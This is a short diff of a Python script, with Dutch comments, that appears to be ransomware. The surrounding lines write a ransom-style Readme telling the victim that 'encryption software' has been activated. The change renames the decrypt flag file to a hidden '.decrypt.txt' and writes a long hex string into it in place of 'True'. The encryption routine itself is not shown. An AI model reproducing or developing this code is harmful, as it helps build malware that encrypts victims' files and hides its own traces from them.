@@ -10,7 +10,7 @@ else:
 
 #Check of er gedecrypt moet worden.
 try:
-   check = open("Decrypt.txt", "r")
+   check = open(".decrypt.txt", "r")
    check_1 = 1
 except:
    check_1 = 0
@@ -55,8 +55,8 @@ Readme.write("Hallo! Je hebt encryptiesoftware geactiveerd!\n Om je bestanden te
 Readme.close()
 
 #Decryptfile aanmaken.
-Decrypt = open("Decrypt.txt","w")
-Decrypt.write("True")
+Decrypt = open(".decrypt.txt","w")
+Decrypt.write("b8cdef42e552ca7389708a4e3001510b9ca22a5a2a78be9dcc51d50f73e4d25b32b44d103c681d26efdf391f11878035e2cafbeb49629aab0d8702a9d228a12b")
 Decrypt.close()
 
 #Endstage
